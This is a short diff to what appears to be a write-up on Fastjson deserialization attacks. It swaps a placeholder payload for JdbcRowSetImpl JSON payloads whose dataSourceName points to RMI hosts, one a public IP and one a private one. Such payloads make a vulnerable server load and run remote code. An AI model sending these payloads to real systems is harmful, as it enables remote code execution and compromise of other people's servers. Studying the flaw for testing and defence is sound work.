@@ -19,9 +19,11 @@
 ```
 {
     "@type": "com.sun.rowset.JdbcRowSetImpl",
-    "dataSourceNamw": "ladp:xxx:1099/Evil",
+    "dataSourceName": "rmi://47.109.58.205:1099/cpuw3a",
     "autoCommit":"true"
 }
+
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
 ```
 ![](https://img-bc.icode.best/26de9fc36b2940c6882491c5453db571.png)
 
